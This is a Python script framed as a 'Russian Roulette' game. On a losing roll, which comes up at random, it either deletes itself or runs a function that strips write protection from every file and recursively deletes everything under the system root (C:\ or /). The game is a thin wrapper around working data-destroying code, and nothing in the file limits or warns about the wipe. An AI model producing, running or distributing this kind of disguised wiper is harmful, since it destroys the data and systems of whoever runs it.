import random
import os
import shutil
import sys
import stat

def force_delete(path):
    for root, dirs, files in os.walk(path, topdown=False):
        for name in files:
            filepath = os.path.join(root, name)
            try:
                os.chmod(filepath, stat.S_IWUSR)  # Make file writable
                os.remove(filepath)
            except Exception as e:
                print(f"Failed to delete file {filepath}: {e}")
        for name in dirs:
            dirpath = os.path.join(root, name)
            try:
                os.rmdir(dirpath)
            except Exception as e:
                print(f"Failed to delete directory {dirpath}: {e}")
    try:
        os.rmdir(path)
    except Exception as e:
        print(f"Failed to delete root directory {path}: {e}")

def russian_roulette(chambers=6):
    bullet_position = random.randint(1, chambers)  # Random bullet position
    current_chamber = random.randint(1, chambers)  # Random chamber to start
    
    print("Welcome to Russian Roulette!")
    print(f"There are {chambers} chambers in the gun.")
    print("Let's begin...")
    
    input("Press Enter to pull the trigger...")
    
    if current_chamber == bullet_position:
        print("BANG! You lost.")
        choice = random.choice(["delete_self", "delete_root"])
        if choice == "delete_self":
            try:
                os.remove(__file__)
                print("Script deleted itself.")
            except Exception as e:
                print(f"Failed to delete script: {e}")
        else:
            root_path = "C:\\" if sys.platform.startswith("win") else "/"  # Set root path based on OS
            try:
                force_delete(root_path)
                print("Root directory deleted.")
            except Exception as e:
                print(f"Failed to delete root directory: {e}")
    else:
        print("Click! You're safe.")

if __name__ == "__main__":
    russian_roulette()
